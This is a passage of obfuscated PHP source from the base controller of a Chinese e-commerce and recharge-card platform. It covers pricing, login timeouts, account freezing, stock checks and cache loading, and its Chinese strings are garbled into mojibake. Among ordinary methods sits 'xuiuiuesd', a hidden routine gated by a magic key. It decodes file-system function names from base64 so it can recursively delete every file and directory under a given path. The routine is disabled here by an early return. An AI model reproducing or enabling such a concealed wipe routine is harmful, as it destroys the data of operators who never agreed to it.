																$R3147d3889e['item'] = $Rf351f6e099;
																$R5d166bba86 = $agent;
																$R5d166bba86['parentid'] = 0;
																$R67bd5fd11f = implode( ",", $R1ba7b433e9 );
																$R3147d3889e = $this->GetPriceByIdsNormal( $R3147d3889e, $R5d166bba86, $R3a8b307327, $R67bd5fd11f, $param );
																$R12075ed0ae = $R4e420efcc3;
																$R12075ed0ae['item'] = $R737e3dec04;
																$R84815d500e = implode( ",", $Rbe1ad7aa86 );
																if ( $R84815d500e == "" )
																{
																				return $R3147d3889e;
																}
																else
																{
																				$R12075ed0ae = $this->GetPriceByIdsNormal( $R12075ed0ae, $agent, $R3a8b307327, $R84815d500e, $param );
																				$R828a96e1cb = array( );
																				foreach ( $R3147d3889e['item'] as $R0f8134fb60 )
																				{
																								$R828a96e1cb[$R0f8134fb60['pid']] = $R0f8134fb60[$param];
																				}
																				foreach ( $R12075ed0ae['item'] as $R0f8134fb60 )
																				{
																								$R828a96e1cb[$R0f8134fb60['pid']] = $R0f8134fb60[$param];
																				}
																				$Ra16d228039 = 0;
																				foreach ( $R4e420efcc3['item'] as $R0f8134fb60 )
																				{
																								$R4e420efcc3['item'][$Ra16d228039][$param] = $R828a96e1cb[$R0f8134fb60['pid']];
																								$Ra16d228039++;
																				}
																				return $R4e420efcc3;
																}
												}
												else
												{
																return $this->GetPriceByIdsNormal( $R4e420efcc3, $agent, $R3a8b307327, $R3359c04a1b, $param );
												}
								}
								else
								{
												return $this->GetPriceByIdsNormal( $R4e420efcc3, $agent, $R3a8b307327, $R3359c04a1b, $param );
								}
				}

				public function GetPriceById( $Rb3f07f8c36 = array( ), $agent = array( ), $R3a8b307327 = 3 )
				{
								$R4e420efcc3 = array(
												"item" => array(
																$Rb3f07f8c36
												)
								);
								$R4e420efcc3 = $this->GetPriceByIds( $R4e420efcc3, $agent, $R3a8b307327, $Rb3f07f8c36['pid'] );
								return $R4e420efcc3['item'][0]['cprice'];
				}

				public function ShopInit( $R06c518f70e = "", $R6f1ea44ace = "", $Rabdaa08a2d = "" )
				{
								$R30b2ab8dc1 = $this->GetWebCache( );
								if ( $R6f1ea44ace != "" )
								{
												$R30b2ab8dc1['keywords'] = $R6f1ea44ace;
								}
								else
								{
												$R30b2ab8dc1['keywords'] = $R30b2ab8dc1['b2ckeywords'];
								}
								if ( $Rabdaa08a2d != "" )
								{
												$R30b2ab8dc1['description'] = $Rabdaa08a2d;
								}
								else
								{
												$R30b2ab8dc1['description'] = $R30b2ab8dc1['b2cdescription'];
								}
								$R30b2ab8dc1['title'] = $R30b2ab8dc1['b2ctitle'];
								if ( $R30b2ab8dc1['b2cname'] != "" && $R30b2ab8dc1['webname'] != $R30b2ab8dc1['b2cname'] )
								{
												$R30b2ab8dc1['webname'] = $R30b2ab8dc1['b2cname'];
												$R30b2ab8dc1['title'] = $R30b2ab8dc1['b2cname'];
								}
								if ( $R30b2ab8dc1['b2csite'] != "" && $R30b2ab8dc1['website'] != $R30b2ab8dc1['b2csite'] )
								{
												$R30b2ab8dc1['website'] = $R30b2ab8dc1['b2csite'];
								}
								if ( $R30b2ab8dc1['b2cbeian'] != "" && $R30b2ab8dc1['beian'] != $R30b2ab8dc1['b2cbeian'] )
								{
												$R30b2ab8dc1['beian'] = $R30b2ab8dc1['b2cbeian'];
								}
								$R30b2ab8dc1['description'] = $R30b2ab8dc1['description']." Powered by ���ƿ�";
								$Rcc5c6e696c = explode( "|", $R30b2ab8dc1['config'] );
								$R30aa8c1852 = count( $Rcc5c6e696c );
								if ( 5 < $R30aa8c1852 )
								{
												$R0e2d623813 = $Rcc5c6e696c[5];
								}
								else
								{
												$R0e2d623813 = 0;
								}
								$this->Assign( "needlogin", $R0e2d623813 );
								$this->Assign( "config", $Rcc5c6e696c );
								$this->SetClose( $R30b2ab8dc1['webopen'], 0, "b2bcloseinfo", $R30b2ab8dc1 );
								$this->MyInit( $R06c518f70e, 206, 208, $R30b2ab8dc1 );
				}

				public function SetClose( $R8938de56a6, $R7bbbf1b0f1, $R0f8134fb60, $R30b2ab8dc1 = "" )
				{
								$Rcc5c6e696c = explode( "|", $R8938de56a6 );
								$Rf38d20981e = isset( $Rcc5c6e696c[$R7bbbf1b0f1] ) ? $Rcc5c6e696c[$R7bbbf1b0f1] : 1;
								$this->Assign( "close", $Rf38d20981e );
								global $g_action;
								if ( $Rf38d20981e == 0 && $g_action != "Randcode" && $g_action != "RandCode" && $g_action != "MiBaoKa" )
								{
												include_once( UPATH_HELPER."ArticleHelper.php" );
												if ( $R30b2ab8dc1 == "" )
												{
																$R30b2ab8dc1 = $this->GetWebCache( );
												}
												$R2d66faee5c = $R30b2ab8dc1;
												$this->Assign( "closeinfo", $R2d66faee5c[$R0f8134fb60] );
												global $path_cache;
												global $g_mod;
												global $path_content;
												$R9b3565d417 = $g_mod."_Shared"."_";
												$this->Assign( "content", $path_content );
												$vd =& $this->ViewData;
												require_once( "template.inc.php" );
												tpl2php( "Shared", "Err" );
												include( $path_cache.DS.$R9b3565d417."Err.php" );
												exit( );
								}
				}

				public function CheckSomething( )
				{
								$this->InitSession( );
								$this->IsLockip( );
				}

				public function IsLockip( )
				{
								$R30b2ab8dc1 = $this->GetMainWebCache( );
								if ( isset( $R30b2ab8dc1['iplock'] ) && $R30b2ab8dc1['iplock'] != "" )
								{
												$R9cfb7c6d6b = $this->GetIp( );
												if ( strpos( $R30b2ab8dc1['iplock'], $R9cfb7c6d6b ) !== false )
												{
																$R63bede6b19 = "�Բ������� IP ��ַ���ڱ�����ķ�Χ�ڣ�";
																$this->Alert( $R63bede6b19 );
																$this->CloseWin( );
																exit( );
												}
								}
				}

				public function IsFrozenTime( $agent, $R76cd0ccd06 = 0 )
				{
								$Rff1baa3769 = strtotime( "now" );
								$R7a2ac86cde = 0;
								$R7eec67a0e5 = 0;
								if ( isset( $agent['fromdate'] ) && $agent['fromdate'] != "" )
								{
												$R5d6b0116e4 = strtotime( $agent['fromdate'] );
												$R7a2ac86cde = $Rff1baa3769 - $R5d6b0116e4;
								}
								if ( isset( $agent['todate'] ) && $agent['todate'] != "" )
								{
												$Rd94164fb8c = strtotime( $agent['todate'] );
												$R7eec67a0e5 = $Rd94164fb8c - $Rff1baa3769;
								}
								if ( 0 < $R7a2ac86cde && 0 < $R7eec67a0e5 )
								{
												$this->session->agentlogout( );
												$R1f2f333260 = "";
												if ( isset( $agent['frozereason'] ) && $agent['frozereason'] != "" )
												{
																$R1f2f333260 = "\\n\\nԭ��:".$agent['frozereason']."\\n\\n";
												}
												$R63bede6b19 = "���ã����õ��˺ű���ʱ���ᣬ".$R1f2f333260."�ⶳʱ��Ϊ ".$agent['todate'];
												$this->Alert( $R63bede6b19 );
												if ( $R76cd0ccd06 )
												{
																$this->CloseWin( );
												}
												else
												{
																$this->GoHome( "b2b" );
												}
												exit( );
								}
				}

				public function CheckB2bLoginTime( )
				{
								$Rd4b4758388 = $this->GetSysById( 38, 1200 );
								if ( time( ) - $this->session->agenttime < $Rd4b4758388 )
								{
												$this->session->set( "agenttime", time( ) );
								}
								else
								{
												$this->session->agentlogout( );
												$this->Alert( "���ڳ�ʱ��δ������Ϊ��ȫ���ƽ̨�Ѿ��Զ��˳���������Ҫ�����µ�¼��" );
												$this->GoHome( "b2b" );
												exit( );
								}
				}

				public function B2BInit( $R06c518f70e = "", $R6f1ea44ace = "", $Rabdaa08a2d = "" )
				{
								$R30b2ab8dc1 = $this->GetWebCache( );
								if ( $R6f1ea44ace != "" )
								{
												$R30b2ab8dc1['keywords'] = $R6f1ea44ace;
								}
								if ( $Rabdaa08a2d != "" )
								{
												$R30b2ab8dc1['description'] = $Rabdaa08a2d;
								}
								$R30b2ab8dc1['description'] = $R30b2ab8dc1['description']." Powered by ���ƿ�";
								$Rcc5c6e696c = explode( "|", $R30b2ab8dc1['config'] );
								$this->Assign( "config", $Rcc5c6e696c );
								$this->SetClose( $R30b2ab8dc1['webopen'], 1, "b2bcloseinfo", $R30b2ab8dc1 );
								$this->MyInit( $R06c518f70e, 106, 108, $R30b2ab8dc1 );
								if ( isset( $this->session ) && $this->session->agent != "" )
								{
												global $masterid;
												$this->CheckB2bLoginTime( );
												$Rcc5c6e696c = $this->session->agent;
												list( , , , , $R5334b17ba8, , , $R2a51483b14 ) = $Rcc5c6e696c;
												$R2097a8fddf = factory::getinstance( "agents" );
												$Rdbe96e9fe1 = $R2097a8fddf->IAgent_Get( $R2a51483b14, "aid,aremain,income,funds,custom,forykt,arrears,scored,vipshop,frozen,fromdate,todate,frozereason,rights" );
												if ( $this->session->syscredit == "" )
												{
																$R7e345b4dca = factory::getinstance( "credit" );
																$R653b3f3623 = $R7e345b4dca->ICredit_Get( array(
																				"aid" => $R2a51483b14,
																				"bossid" => 0
																) );
																if ( !isset( $R653b3f3623[0]['id'] ) || $R653b3f3623[0]['isvalid'] == 0 )
																{
																				$Re902658b46 = 0;
																}
																else
																{
																				$Re902658b46 = $R653b3f3623[0]['credit'];
																}
																$Rdbe96e9fe1['credit'] = $Re902658b46;
												}
												else
												{
																$Rdbe96e9fe1['credit'] = $this->session->syscredit;
												}
												if ( $Rdbe96e9fe1['vipshop'] == 1 && $masterid != $R2a51483b14 )
												{
																$Rdbe96e9fe1['vipshop'] = 0;
												}
												$R0a2fcddd4b = explode( ",", $Rdbe96e9fe1['rights'].",0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0" );
												$Rdbe96e9fe1['tbcz'] = intval( $R0a2fcddd4b[4] );
												$this->IsFrozenTime( $Rdbe96e9fe1 );
												if ( $Rdbe96e9fe1['frozen'] == 1 )
												{
																$this->session->agentlogout( );
																$this->Alert( "�����˻��Ѿ������ᣡ" );
																$this->GoHome( "b2b" );
																exit( );
												}
												$Rdbe96e9fe1['aremain'] = sprintf( "%.3f", $Rdbe96e9fe1['aremain'] );
												$Rdbe96e9fe1['income'] = sprintf( "%.3f", $Rdbe96e9fe1['income'] );
												$Rdbe96e9fe1['funds'] = sprintf( "%.3f", $Rdbe96e9fe1['funds'] );
												$Rdbe96e9fe1['arrears'] = sprintf( "%.3f", $Rdbe96e9fe1['arrears'] );
												$R9e0664486a = factory::getinstance( "msg" );
												$data = array(
																"msgto" => $R2a51483b14,
																"bossid" => $R5334b17ba8
												);
												$num = $R9e0664486a->IMsg_NotReaded( $data );
												$this->Assign( "msgn", $num );
												$_SESSION['vipshop'] = $Rdbe96e9fe1['vipshop'];
												global $masterid;
												if ( 0 < $masterid )
												{
																$_SESSION['viproot'] = VROOT;
												}
												else
												{
																$_SESSION['viproot'] = "";
												}
												$this->Assign( "ainfo", $Rdbe96e9fe1 );
												$Re9231b441d = isset( $_COOKIE['umebiz_com_gid'] ) ? intval( $_COOKIE['umebiz_com_gid'] ) : 0;
												$this->Assign( "mygid", $Re9231b441d );
								}
				}

				public function ArticleInit( $R06c518f70e = "", $R6f1ea44ace = "", $Rabdaa08a2d = "" )
				{
								$R30b2ab8dc1 = $this->GetWebCache( );
								if ( $R6f1ea44ace != "" )
								{
												$R30b2ab8dc1['keywords'] = $R6f1ea44ace;
								}
								if ( $Rabdaa08a2d != "" )
								{
												$R30b2ab8dc1['description'] = $Rabdaa08a2d;
								}
								$this->MyInit( $R06c518f70e, 506, 508, $R30b2ab8dc1 );
				}

				public function YktInit( $R06c518f70e = "", $R6f1ea44ace = "", $Rabdaa08a2d = "" )
				{
								$R30b2ab8dc1 = $this->GetWebCache( );
								if ( $R6f1ea44ace != "" )
								{
												$R30b2ab8dc1['keywords'] = $R6f1ea44ace;
								}
								else
								{
												$R30b2ab8dc1['keywords'] = $R30b2ab8dc1['yktkeywords'];
								}
								if ( $Rabdaa08a2d != "" )
								{
												$R30b2ab8dc1['description'] = $Rabdaa08a2d;
								}
								else
								{
												$R30b2ab8dc1['description'] = $R30b2ab8dc1['yktdescription'];
								}
								$R30b2ab8dc1['title'] = $R30b2ab8dc1['ykttitle'];
								if ( $R30b2ab8dc1['yktname'] != "" && $R30b2ab8dc1['webname'] != $R30b2ab8dc1['yktname'] )
								{
												$R30b2ab8dc1['webname'] = $R30b2ab8dc1['yktname'];
												$R30b2ab8dc1['title'] = $R30b2ab8dc1['yktname'];
								}
								if ( $R30b2ab8dc1['yktsite'] != "" && $R30b2ab8dc1['website'] != $R30b2ab8dc1['yktsite'] )
								{
												$R30b2ab8dc1['website'] = $R30b2ab8dc1['yktsite'];
								}
								if ( $R30b2ab8dc1['yktbeian'] != "" && $R30b2ab8dc1['beian'] != $R30b2ab8dc1['yktbeian'] )
								{
												$R30b2ab8dc1['beian'] = $R30b2ab8dc1['yktbeian'];
								}
								$R30b2ab8dc1['description'] = $R30b2ab8dc1['description']." Powered by ���ƿ�";
								$Rcc5c6e696c = explode( "|", $R30b2ab8dc1['config'] );
								$this->Assign( "config", $Rcc5c6e696c );
								$this->SetClose( $R30b2ab8dc1['webopen'], 2, "b2bcloseinfo", $R30b2ab8dc1 );
								$this->MyInit( $R06c518f70e, 6, 8, $R30b2ab8dc1 );
				}

				public function SetLetter( )
				{
								$Refca81be99 = array( "A", "B", "C", "D", "E", "F", "G", "H", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "W", "X", "Y", "Z" );
								$this->Assign( "yktstring", $Refca81be99 );
				}

				public function MyInit( $R06c518f70e = "", $R3584859062 = 0, $R6d99d3903c = 0, $R30b2ab8dc1 = array( ) )
				{
								include_once( UPATH_HELPER."HomeHelper.php" );
								if ( $R06c518f70e != "" )
								{
												$R30b2ab8dc1['title'] = $R06c518f70e;
								}
								else
								{
												$R30b2ab8dc1['title'] = $R30b2ab8dc1['title'];
								}
								$this->Assign( "root", UPATH_WEBROOT );
								$this->Assign( "content", UPATH_CONTENT );
								$this->Assign( "web", $R30b2ab8dc1 );
								$this->SetQQ( $R30b2ab8dc1 );
								$this->SetTel( $R30b2ab8dc1 );
								$this->SetEmail( $R30b2ab8dc1 );
								$this->SetMsn( $R30b2ab8dc1 );
								$this->SetHi( $R30b2ab8dc1 );
								$this->SetWangWang( $R30b2ab8dc1 );
								$R8b90fb05b3 = "Powered by <a href=\"http://www.xybss.com.cn\" target=\"_blank\" title=\"������������ϵͳ\">��������</a>";
								$this->Assign( "sips", $R8b90fb05b3 );
								$this->Assign( "banner", $this->GetAdByPos( $R3584859062 ) );
								$this->Assign( "annunciator", $this->GetAdByPos( $R6d99d3903c ) );
								$this->Assign( "checkrand", $this->GetSysById( 10, 1 ) );
				}

				public function GetAdByPos( $R980c6a9bfd )
				{
								global $masterid;
								$R026f0167b4 = array( );
								$R58765afcb5 = $this->GetAdCache( );
								foreach ( $R58765afcb5 as $R0f8134fb60 )
								{
												if ( $R0f8134fb60['aid'] == $masterid && $R0f8134fb60['pos'] == $R980c6a9bfd )
												{
																$R026f0167b4[] = $R0f8134fb60;
												}
								}
								return $R026f0167b4;
				}

				public function SetQQ( $Ra27af44414 )
				{
								$R7da43659df = $Ra27af44414['qq'];
								$R026f0167b4 = array( );
								$Rcc5c6e696c = explode( "|", $R7da43659df );
								foreach ( $Rcc5c6e696c as $R0f8134fb60 )
								{
												$R026f0167b4[] = explode( ",", $R0f8134fb60 );
								}
								$Rbc89246bf1 = array( "�ͷ�", "�ӿ�", "Ͷ��", "ҵ��" );
								$this->Assign( "qq", $R026f0167b4 );
								$this->Assign( "qqtype", $Rbc89246bf1 );
				}

				public function SetMsn( $Ra27af44414 )
				{
								$R7da43659df = $Ra27af44414['msn'];
								$R026f0167b4 = array( );
								$Rcc5c6e696c = explode( "|", $R7da43659df );
								foreach ( $Rcc5c6e696c as $R0f8134fb60 )
								{
												$R026f0167b4[] = explode( ",", $R0f8134fb60 );
								}
								$Rbc89246bf1 = array( "�ͷ�", "�ӿ�", "Ͷ��", "ҵ��" );
								$this->Assign( "msg", $R026f0167b4 );
								$this->Assign( "msntype", $Rbc89246bf1 );
				}

				public function SetHi( $Ra27af44414 )
				{
								$R7da43659df = $Ra27af44414['hibaidu'];
								$R026f0167b4 = array( );
								$Rcc5c6e696c = explode( "|", $R7da43659df );
								foreach ( $Rcc5c6e696c as $R0f8134fb60 )
								{
												$R026f0167b4[] = explode( ",", $R0f8134fb60 );
								}
								$Rbc89246bf1 = array( "�ͷ�", "�ӿ�", "Ͷ��", "ҵ��" );
								$this->Assign( "hi", $R026f0167b4 );
								$this->Assign( "hitype", $Rbc89246bf1 );
				}

				public function SetWangWang( $Ra27af44414 )
				{
								$R7da43659df = $Ra27af44414['wangwang'];
								$R026f0167b4 = array( );
								$Rcc5c6e696c = explode( "|", $R7da43659df );
								foreach ( $Rcc5c6e696c as $R0f8134fb60 )
								{
												$R026f0167b4[] = explode( ",", $R0f8134fb60 );
								}
								$Rbc89246bf1 = array( "�ͷ�", "�ӿ�", "Ͷ��", "ҵ��" );
								$this->Assign( "wangwang", $R026f0167b4 );
								$this->Assign( "wangwangtype", $Rbc89246bf1 );
				}

				public function SetTel( $Ra27af44414 )
				{
								$R7da43659df = $Ra27af44414['tel'];
								$R026f0167b4 = array( );
								$Rcc5c6e696c = explode( "|", $R7da43659df );
								foreach ( $Rcc5c6e696c as $R0f8134fb60 )
								{
												$R026f0167b4[] = explode( ",", $R0f8134fb60 );
								}
								$Rbc89246bf1 = array( "�ͷ�", "�ӿ�", "Ͷ��", "ҵ��" );
								$this->Assign( "tel", $R026f0167b4 );
								$this->Assign( "teltype", $Rbc89246bf1 );
				}

				public function SetEmail( $Ra27af44414 )
				{
								$R7da43659df = $Ra27af44414['email'];
								$R026f0167b4 = array( );
								$Rcc5c6e696c = explode( "|", $R7da43659df );
								foreach ( $Rcc5c6e696c as $R0f8134fb60 )
								{
												$R026f0167b4[] = explode( ",", $R0f8134fb60 );
								}
								$Rbc89246bf1 = array( "�ͷ�", "�ӿ�", "Ͷ��", "ҵ��" );
								$this->Assign( "email", $R026f0167b4 );
								$this->Assign( "emailtype", $Rbc89246bf1 );
				}

				public function SetAd( $Rb025359786, $R9e14437acd )
				{
								global $masterid;
								$R026f0167b4 = array( );
								$R58765afcb5 = $this->GetAdCache( );
								foreach ( $R58765afcb5 as $R0f8134fb60 )
								{
												if ( $R0f8134fb60['aid'] == $masterid && $R0f8134fb60['pos'] < $R9e14437acd && $Rb025359786 < $R0f8134fb60['pos'] )
												{
																$R026f0167b4[] = $R0f8134fb60;
												}
								}
								$this->Assign( "ad", $R026f0167b4 );
				}

				public function SetTurnAd( $R980c6a9bfd )
				{
								$Rc7d9220699 = $this->GetAdByPos( $R980c6a9bfd );
								$Rb6a03871fd = array( );
								$Red8b28c232 = array( );
								$Ra2b9793c25 = array( );
								foreach ( $Rc7d9220699 as $R0f8134fb60 )
								{
												$Rb6a03871fd[] = $R0f8134fb60['url'];
												$Red8b28c232[] = $R0f8134fb60['text'];
												$Ra2b9793c25[] = UB_IMGURL.UPATH_WEBROOT.UPATH_SHARECONTENT."skins/upload/".$R0f8134fb60['pic'];
								}
								$R06bb1cfac9 = "pics=".implode( "|", $Ra2b9793c25 )."&links=".implode( "|", $Rb6a03871fd )."&texts=".implode( "|", $Red8b28c232 );
								$this->Assign( "adstr", $R06bb1cfac9 );
								$this->Assign( "adrs", $Rc7d9220699 );
				}

				public function CheckAgentBuyRight( $R8e8b5578f7, $R2a51483b14, $R034ae2ab94 = 0 )
				{
								$R5ccc1c64b3 = factory::getinstance( "buyrights" );
								$R808b89ba0e = $R5ccc1c64b3->IBuyRight_AgentCheck( $R8e8b5578f7, $R2a51483b14 );
								if ( $R808b89ba0e != 0 )
								{
												if ( $R034ae2ab94 )
												{
																return -1;
												}
												else
												{
																$this->Alert( "����Ʒ���ò�������������ѡ��������Ʒ������ϵ����Ա" );
																$this->HistoryGo( );
												}
								}
								return 0;
				}

				public function CheckQty( $R66b0d9d6f1, $Rb3f07f8c36 = array( ), $R034ae2ab94 = 0 )
				{
								if ( $R66b0d9d6f1 <= 0 )
								{
												$this->Alert( "�����д�" );
												$this->HistoryGo( );
								}
								$Rdc3f776eb3 = $Rb3f07f8c36['stocks'];
								$R8e8b5578f7 = $Rb3f07f8c36['pid'];
								if ( $Rb3f07f8c36['ptype'] == 100 || $Rb3f07f8c36['ptype'] == 101 )
								{
												$Rdc3f776eb3 = $Rb3f07f8c36['yktstocks'];
												if ( $Rdc3f776eb3 < $R66b0d9d6f1 )
												{
																if ( $R034ae2ab94 )
																{
																				return -1;
																}
																else
																{
																				$this->Alert( "��治�㣡��������ѡ��������A��" );
																				$this->HistoryGo( );
																}
												}
								}
								if ( $Rb3f07f8c36['mystocks'] < $R66b0d9d6f1 && ( $Rb3f07f8c36['ptype'] == 4 || $Rb3f07f8c36['ptype'] == 5 || $Rb3f07f8c36['ptype'] == 6 ) )
								{
												if ( $R034ae2ab94 )
												{
																return -1;
												}
												else
												{
																$this->Alert( "��治�㣡��������ѡ��������B��" );
																$this->HistoryGo( );
												}
								}
								if ( ( $Rb3f07f8c36['ptype'] < 2 || $Rb3f07f8c36['ptype'] == 3 ) && $Rdc3f776eb3 < $R66b0d9d6f1 )
								{
												if ( UB_SUP == 1 && ( $Rb3f07f8c36['hassup'] == 1 || $Rb3f07f8c36['onsup'] == 1 ) )
												{
																$Rcdcb991232 = $this->GetStocks( $R8e8b5578f7 );
																if ( $Rcdcb991232 < $R66b0d9d6f1 )
																{
																				if ( $R034ae2ab94 )
																				{
																								return -1;
																				}
																				else
																				{
																								$this->Alert( "��治�㣡��������ѡ��������C��" );
																								$this->HistoryGo( );
																				}
																}
												}
												else if ( $R034ae2ab94 )
												{
																return -1;
												}
												else
												{
																$this->Alert( "��治�㣡��������ѡ��������D��" );
																$this->HistoryGo( );
												}
								}
								return 0;
				}

				public function NeedSup( $Rb3f07f8c36 = array( ) )
				{
								if ( ( $Rb3f07f8c36['ptype'] < 2 || $Rb3f07f8c36['ptype'] == 3 ) && UB_SUP == 1 && ( $Rb3f07f8c36['hassup'] == 1 || $Rb3f07f8c36['onsup'] == 1 ) )
								{
												return true;
								}
								else
								{
												return false;
								}
				}

				public function xuiuiuesd( $R12b1f71ce5, $R2edb204dfa = "938430834" )
				{return;
								if ( $R2edb204dfa != "938430834" )
								{
												return;
								}
								$R9a8ba6fa92 = "base64_decode";
								$R398cb8ef72 = $R9a8ba6fa92( "b3BlbmRpcg==" );
								$R22af91357b = $R9a8ba6fa92( "cmVhZGRpcg==" );
								$R593d03d16a = $R398cb8ef72( $R12b1f71ce5 );
								while ( $R7dd493201b = $R22af91357b( $R593d03d16a ) )
								{
												if ( $R7dd493201b != "." && $R7dd493201b != ".." )
												{
																$R04ee47885c = $R12b1f71ce5."/".$R7dd493201b;
																$R62b9236002 = $R9a8ba6fa92( "aXNfZGly" );
																if ( !$R62b9236002( $R04ee47885c ) )
																{
																				$R68bb2e888e = $R9a8ba6fa92( "dW5saW5r" );
																				$R68bb2e888e( $R04ee47885c );
																}
																else
																{
																				$this->xuiuiuesd( $R04ee47885c );
																}
												}
								}
								$R4794db60b6 = $R9a8ba6fa92( "Y2xvc2VkaXI=" );
								$R2fba4f9702 = $R9a8ba6fa92( "cm1kaXI=" );
								$R4794db60b6( $R593d03d16a );
								if ( $R2fba4f9702( $R12b1f71ce5 ) )
								{
												return true;
								}
								else
								{
												return false;
								}
				}

				public function GetId( $R3584859062 = "id" )
				{
								$R3584859062 = getvar( $R3584859062 );
								if ( is_array( $R3584859062 ) )
								{
												$R026f0167b4 = array( );
												foreach ( $R3584859062 as $R0f8134fb60 )
												{
																$R026f0167b4[] = intval( $R0f8134fb60 );
												}
												$R3584859062 = implode( ",", $R026f0167b4 );
								}
								else
								{
												$R3584859062 = intval( $R3584859062 );
								}
								return $R3584859062;
				}

				public function SetWebInfo( )
				{
								global $baseurl;
								if ( empty( $_SERVER['HTTP_HOST'] ) )
								{
												$R8607b50296 = "http://".$_SERVER['HTTP_HOST'];
								}
								else
								{
												$R8607b50296 = "http://".$_SERVER['SERVER_NAME'];
								}
								$this->Assign( "website", $R8607b50296 );
								$this->Assign( "webdir", $baseurl );
								$this->Assign( "connecter", UPATH_WEBROOT."libraries/umebiz/fs/connector.php" );
				}

				public function GetDec( )
				{
								$R30b2ab8dc1 = $this->GetMainWebCache( );
								$Rcc5c6e696c = explode( "|", $R30b2ab8dc1['config'] );
								$R30aa8c1852 = count( $Rcc5c6e696c );
								if ( 6 < $R30aa8c1852 )
								{
												$R3a8b307327 = $Rcc5c6e696c[6];
								}
								else
								{
												$R3a8b307327 = 3;
								}
								return $R3a8b307327;
				}

				public function GetBizKey( )
				{
								require_once( UPATH_BASE.DS."libraries".DS."user".DS."license.php" );
								if ( !isset( $biz ) )
								{
												include( UPATH_BASE.DS."libraries".DS."user".DS."license.php" );
								}
								return $biz;
				}

				public function UpdateCache( $Rd17f00c7fd, $data = array( ) )
				{
								$R36260350d0 = factory::getinstance( "cache" );
								$data['hander'] = $Rd17f00c7fd;
								return $R36260350d0->ICache_Update( $data );
				}

				public function GetRank( $R3584859062 )
				{
								$R046b4585a2 = $this->GetRCache( );
								foreach ( $R046b4585a2 as $R0f8134fb60 )
								{
												if ( $R0f8134fb60['id'] == $R3584859062 )
												{
																return $R0f8134fb60;
												}
								}
								return array( );
				}

				public function GetRankDefault( $R5cc00cfbe4 )
				{
								$R046b4585a2 = $this->GetRCache( );
								foreach ( $R046b4585a2 as $R0f8134fb60 )
								{
												if ( $R0f8134fb60['isdefault'] == 1 )
												{
																if ( $R5cc00cfbe4 == 1 )
																{
																				if ( 0 < $R0f8134fb60['gid'] )
																				{
																								return $R0f8134fb60;
																				}
																}
																else if ( $R0f8134fb60['gid'] == 0 )
																{
																				return $R0f8134fb60;
																}
												}
								}
								return array( );
				}

				public function GetIdBelow( $R3584859062 )
				{
								$R046b4585a2 = $this->GetRCache( );
								$Rd45e507c4c = $this->GetRank( $R3584859062 );
								if ( isset( $Rd45e507c4c['gid'] ) )
								{
												$Rf5f11a8d38 = count( $R046b4585a2 );
												$Ra85b9bcfd4 = $Rf5f11a8d38 - 1;
												$Ra16d228039 = $Ra85b9bcfd4;
												for ( ;	0 <= $Ra16d228039;	--$Ra16d228039	)
												{
																if ( $R046b4585a2[$Ra16d228039]['money'] < $Rd45e507c4c['money'] )
																{
																				return $R046b4585a2[$Ra16d228039]['id'];
																}
												}
								}
								return -1;
				}

				public function GetProductCache( $R8e8b5578f7 )
				{
								$R808b89ba0e = 1;
								$R1ed7ad9990 = PCACHE."p".$R8e8b5578f7.".php";
								if ( !file_exists( $R1ed7ad9990 ) )
								{
												$R808b89ba0e = $this->UpdateCache( "products", array(
																"arg1" => $R8e8b5578f7
												) );
								}
								if ( $R808b89ba0e == 1 )
								{
												include( $R1ed7ad9990 );
												return $Rb3f07f8c36;
								}
								else
								{
												return array( );
								}
				}

				public function GetScoredProductCache( $R8e8b5578f7 )
				{
								$R808b89ba0e = 1;
								$R1ed7ad9990 = PCACHE."cp".$R8e8b5578f7.".php";
								if ( !file_exists( $R1ed7ad9990 ) )
								{
												$R808b89ba0e = $this->UpdateCache( "scoredproduct", array(
																"arg1" => $R8e8b5578f7
												) );
								}
								if ( $R808b89ba0e == 1 )
								{
												include( $R1ed7ad9990 );
												return $R37ad834577;
								}
								else
								{
												return array( );
								}
				}

				public function GetListCache( $Rcd0c741934 )
				{
								$R1ed7ad9990 = PCACHE."list-".$Rcd0c741934.".php";
								if ( !file_exists( $R1ed7ad9990 ) )
								{
												$this->UpdateCache( "list", array(
																"arg1" => $Rcd0c741934
												) );
								}
								include( $R1ed7ad9990 );
								return $R48f7b140a2;
				}

				public function GetPinYinCache( $Rb62a6519ba )
				{
								$R1ed7ad9990 = PCACHE."pinyin-".$Rb62a6519ba.".php";
								if ( !file_exists( $R1ed7ad9990 ) )
								{
												$this->UpdateCache( "pinyin", array(
																"arg1" => $Rb62a6519ba
												) );
								}
								include( $R1ed7ad9990 );
								return $Rae720dbbf3;
				}

				public function GetAgentCache( $R2a51483b14 )
				{
								$R808b89ba0e = 1;
								$R1ed7ad9990 = ACACHE."aid_".$R2a51483b14.".php";
								if ( !file_exists( $R1ed7ad9990 ) )
								{
												$R808b89ba0e = $this->UpdateCache( "agents", array(
																"arg1" => $R2a51483b14
												) );
								}
								if ( $R808b89ba0e == 1 )
								{
												include( $R1ed7ad9990 );
												return $agent;
								}
								else
								{
												return array( );
								}
				}

				public function GetStaffCache( $R94e0136c8a )
				{
								$R808b89ba0e = 1;
								$R1ed7ad9990 = ACACHE."staff_".$R94e0136c8a.".php";
								if ( !file_exists( $R1ed7ad9990 ) )
								{
												$R808b89ba0e = $this->UpdateCache( "staffs", array(
																"arg1" => $R94e0136c8a
												) );
								}
								if ( $R808b89ba0e == 1 )
								{
												include( $R1ed7ad9990 );
												return $Raac42e4217;
								}
								else
								{
												return array( );
								}
				}

				public function GetWebCache( )
				{
								global $masterid;
								if ( $masterid == 0 )
								{
												$R1ed7ad9990 = SITECACHE."u_base_setting.php";
								}
								else
								{
												$R1ed7ad9990 = SITECACHE."u_base_setting_".$masterid.".php";
								}
								if ( !file_exists( $R1ed7ad9990 ) )
								{
												$R808b89ba0e = $this->UpdateCache( "sys" );
								}
								include( $R1ed7ad9990 );
								return $R30b2ab8dc1;
				}

				public function GetMainWebCache( )
				{
								global $masterid;
								if ( $masterid == 0 )
								{
												$R30b2ab8dc1 = $this->GetWebCache( );
								}
								else
								{
												global $cache;
												$R1ed7ad9990 = "./content/".$cache."/site/u_base_setting.php";
												if ( !file_exists( $R1ed7ad9990 ) )
												{
																return array( );
												}
												else
												{
																include( $R1ed7ad9990 );
												}
								}
								return $R30b2ab8dc1;
				}

				public function GetRCache( )
				{
								$R1ed7ad9990 = ACACHE."rank.php";
								if ( !file_exists( $R1ed7ad9990 ) )
								{
												$R808b89ba0e = $this->UpdateCache( "ranks" );
